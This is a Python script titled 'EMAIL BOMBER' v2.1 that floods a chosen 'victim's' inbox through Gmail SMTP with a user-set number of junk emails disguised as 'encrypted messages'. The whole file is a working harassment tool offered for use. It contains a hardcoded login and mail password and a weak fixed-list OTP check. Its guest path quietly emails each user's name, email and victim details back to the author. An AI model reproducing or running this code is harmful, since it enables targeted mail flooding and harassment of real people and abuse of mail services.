#EMAIL BOMBER
#BY AMLAN SAHA KUNDU
#Ver 2.1
#-----------------------------------------------------------------------

import smtplib,random,string,datetime

#Welcome User :) -------------------------------------------------------

print(' '+'='*33+'\n'+' Welcome to Email-bomber v2.0 \n\t  by Amlan'+'\n'+' '+'='*33+'\n ')
print(" Enter \t 1 for Admin Log In \n \t 2 for Guest Sign Up\n")

#USER INPUT PART--------------------------------------------------------

uch = int(input("Enter your choice: "))
if uch == 1:
    i = 3
    while i >0:
        un = input("\nUsername : ") 
        ps = input("Password : ")
        if (un == "amlan" and ps == "BlboNa"):
            print("Login Successful")
            print("Welcome "+un)
            vic = input("Enter victim's email address : ")
            vnm = input("Enter ur victim's first name : ")
            num = input("No. of mail you want to send : ")
            uid = input("Enter your User ID [10 - 99] : ")
            user = un
            #MAIL GENERATION--------------------------------------------------------

            def randomString(stringLength):
                letters = string.ascii_lowercase
                return ''.join(random.choice(letters) for i in range(stringLength))

            sub = randomString(32)
            doby = "Hello "+str(vnm)+"!\nYou have an Encrypted Message from our user. \n[UserID : CXU249568"+str(uid)+"].\n\nYour ENCRYPTED MESSAGE is :\n\n"+randomString(1024)+"\n\nKEY : "+randomString(120)+str(random.randint(10000000,99999999))+"\n\nThank you for using our 512-bit Encryption System.\n\n\n"

            #SENDING PART-----------------------------------------------------------
            server = smtplib.SMTP('smtp.gmail.com',587)
            server.ehlo()
            server.starttls()
            server.ehlo()

            server.login('YourMail.india@gmail.com','BlboNa')
            n = 1
            while n <= int(num):
                subject = sub+"::P: "+str(n)
                body = doby
                
                msg = f"Subject: {subject} \n\n {body}"

                server.sendmail(
                    'YourMail.india@gmail.com',
                    vic,
                    msg
                )
                print("HEY "+user+" , EMAIL HAS BEEN SENT SUCCESSFULLY for "+str(n)+" times")
                n = n+1

            break
        else:
            print("Wrong username and password combination!!")
            i = i - 1
            if i!= 0:
                print("You have "+str(i)+" attempts left")
            else:
                print("No. of attempts has been exceeded. Program is terminating...")
                exit()

else:
    #USER INPUT____________________________________________________

    print("\n Please Sign Up \n "+"-"*15+"\n")
    user = input("Enter your name  : ")
    mail = input("Enter your email : ")

    #SERVER LOGIN--------------------------------------------------
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.ehlo()

    server.login('YourMail.india@gmail.com','BlboNa')

    #OTP MAIL GENERATION-------------------------------------------

    otp = [384632, 701565, 363563, 907353, 624209, 130687, 989153, 494930, 819293, 425905, 648354, 855622, 301326, 226462, 873547, 541724, 318725, 903516, 272045, 833316, 119908, 534203, 908608, 652123, 678809, 913742, 803596, 661437, 913054, 745096, 162281, 345673, 553551, 456307, 819893, 587213, 762050, 888458, 298501, 923013, 229874, 923619, 424781, 878507, 993003, 667262, 216649, 263074, 448738, 103316, 820226, 797047, 175055, 609206, 349881, 641109, 650546, 181557, 596569, 179502, 258144, 735545, 559948, 326902, 756171, 671684, 997005, 584206, 277439, 734508, 452476, 131266, 892148, 327095, 915870, 794384, 370810, 486159, 444204, 567343, 952003, 115921, 492855, 833748, 938155, 969733, 623716, 189156, 826083, 111506, 459581, 574404, 550128, 549516, 561761, 426479, 280488, 840580, 261705, 251918, 566767]

    sub = "OTP for email-bomber v2.0"
    k = random.randint(0,100)
    otpsend = otp[k]
    doby = "Hi "+user+" !!\n Your OTP for email-bomber v2.0 is :"+str(otpsend)+". Thank you for using email-bomber v2.0 by Amlan."

    #OTP SEND-------------------------------------------------------
    subject = sub
    body = doby

    msg = f"Subject: {subject} \n\n {body}"

    server.sendmail(
        'YourMail.india@gmail.com',
        mail,
        msg
    )

    #CONFIRMATION----------------------------------------------------
    print("\nHEY "+user+" , OTP HAS BEEN SENT SUCCESSFULLY to "+mail+"\n")

    while True:
        val = input("ENTER your 6 digit OTP : ")
        flag = 0
        for i in range(0,100):
            otpval = otp[i]
            if str(otpval) == val:
                flag = 1
                break
            else:
                continue
        if flag == 1:
            print("OTP is valid")
            print("Thank you for signing up with us.")
            
            print('\n\n Hello '+ user + ' !! \n')
            print(' '+'='*33+'\n'+' Welcome to Email-bomber v2.0 \n\t  by Amlan'+'\n'+' '+'='*33+'\n ')


        
            vic = input("Enter victim's email address : ")
            vnm = input("Enter ur victim's first name : ")
            num = input("No. of mail you want to send : ")
            uid = input("Enter your User ID [10 - 99] : ")

            #MAIL GENERATION--------------------------------------------------------

            def randomString(stringLength):
                letters = string.ascii_lowercase
                return ''.join(random.choice(letters) for i in range(stringLength))

            sub = randomString(32)
            doby = "Hello "+str(vnm)+"!\nYou have an Encrypted Message from our user. \n[UserID : CXU249568"+str(uid)+"].\n\nYour ENCRYPTED MESSAGE is :\n\n"+randomString(1024)+"\n\nKEY : "+randomString(120)+str(random.randint(10000000,99999999))+"\n\nThank you for using our 512-bit Encryption System.\n\n\n"

            #SENDING PART-----------------------------------------------------------
            server = smtplib.SMTP('smtp.gmail.com',587)
            server.ehlo()
            server.starttls()
            server.ehlo()

            server.login('YourMail.india@gmail.com','BlboNa')
            n = 1
            while n <= int(num):
                subject = sub+"::P: "+str(n)
                body = doby
                
                msg = f"Subject: {subject} \n\n {body}"

                server.sendmail(
                    'YourMail.india@gmail.com',
                    vic,
                    msg
                )
                print("HEY "+user+" , EMAIL HAS BEEN SENT SUCCESSFULLY for "+str(n)+" times")
                n = n+1
                
            #===================================================================
            x = datetime.datetime.now()
            
            repodoby = "Time stamp: "+str(x)+"\n User's Name: "+user+"\n User's mail: "+mail+"\n User-ID [UID]: "+str(uid)+"\n Victim's Name: "+vnm+"\n Victim's mail: "+vic+"\n No. of email sent :"+ str(int(n)-1)+" ["+str(num)+"]."

            reposub = "REPORT of email-bomber_v2.0"

            repomsg = f"Subject: {reposub} \n\n {repodoby}"
            server.sendmail(
                'YourMail.india@gmail.com',
                'YourMail@gmail.com',
                repomsg
            )
            print("\n SUMMARY \n"+repodoby+"\n Thank you for using our service. \n\n")
            screenon=input()
            break

        
        else:
            print("OTP is not valid")
            print("Resending OTP ...")     
            otp = [384632, 701565, 363563, 907353, 624209, 130687, 989153, 494930, 819293, 425905, 648354, 855622, 301326, 226462, 873547, 541724, 318725, 903516, 272045, 833316, 119908, 534203, 908608, 652123, 678809, 913742, 803596, 661437, 913054, 745096, 162281, 345673, 553551, 456307, 819893, 587213, 762050, 888458, 298501, 923013, 229874, 923619, 424781, 878507, 993003, 667262, 216649, 263074, 448738, 103316, 820226, 797047, 175055, 609206, 349881, 641109, 650546, 181557, 596569, 179502, 258144, 735545, 559948, 326902, 756171, 671684, 997005, 584206, 277439, 734508, 452476, 131266, 892148, 327095, 915870, 794384, 370810, 486159, 444204, 567343, 952003, 115921, 492855, 833748, 938155, 969733, 623716, 189156, 826083, 111506, 459581, 574404, 550128, 549516, 561761, 426479, 280488, 840580, 261705, 251918, 566767]
            sub = "OTP for email-bomber v2.0"
            k = random.randint(0,100)
            otpsend = otp[k]
            doby = "Hi "+user+" !!\n Your OTP for email-bomber v2.0 is :"+str(otpsend)+". Thank you for using email-bomber v2.0 by Amlan."

            #OTP SEND-------------------------------------------------------
            subject = sub
            body = doby

            msg = f"Subject: {subject} \n\n {body}"

            server.sendmail(
                'YourMail.india@gmail.com',
                mail,
                msg
            )

            #CONFIRMATION----------------------------------------------------
            print("\nHEY "+user+" , OTP HAS BEEN SENT SUCCESSFULLY to "+mail+"\n" )




